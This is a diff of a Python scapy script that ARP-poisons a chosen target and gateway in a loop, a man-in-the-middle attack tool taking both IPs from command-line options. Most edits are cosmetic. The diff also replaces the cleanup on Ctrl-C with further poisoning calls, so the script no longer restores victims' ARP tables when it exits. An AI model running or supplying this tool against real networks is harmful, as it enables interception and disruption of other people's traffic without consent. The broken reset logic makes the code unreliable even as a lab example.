@@ -1,6 +1,7 @@
 import scapy.all as scapy
 import time
 import optparse
+import re
 
 def get_mac_address(ip):
     arp_request_packet = scapy.ARP(pdst=ip)
@@ -29,39 +30,45 @@ def reset_operation(fooled_ip,gateway_ip):
     scapy.send(arp_response,verbose=False,count=6)
 
 def get_user_input():
+
     parse_object = optparse.OptionParser()
 
-    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
+    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
     parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")
-
-    options = parse_object.parse_args()[0]
+    options=parse_object.parse_args()[0]
 
     if not options.target_ip:
         print("Enter Target IP")
 
     if not options.gateway_ip:
-        print("Enter Gateway IP")
+        print("Enter gateway IP")
 
     return options
 
 number = 0
 
-user_ips = get_user_input()
-user_target_ip = user_ips.target_ip
-user_gateway_ip = user_ips.gateway_ip
+user_ip = get_user_input()
+user_target_ip = user_ip.target_ip
+user_gateway_ip = user_ip.gateway_ip
 
 try:
+
     while True:
 
         arp_poisoning(user_target_ip,user_gateway_ip)
         arp_poisoning(user_gateway_ip,user_target_ip)
 
-        number += 2
+        number +=2
 
-        print("\rSending packets " + str(number),end="")
+        print("\rSending packets..."+str(number),end="")
 
         time.sleep(3)
+
 except KeyboardInterrupt:
-    print("\nQuit & Reset")
-    reset_operation(user_target_ip,user_gateway_ip)
-    reset_operation(user_gateway_ip,user_target_ip)
+
+    print("\n Quit & Reset")
+
+    arp_poisoning(user_target_ip, user_gateway_ip)
+    arp_poisoning(user_gateway_ip, user_target_ip)
+
+
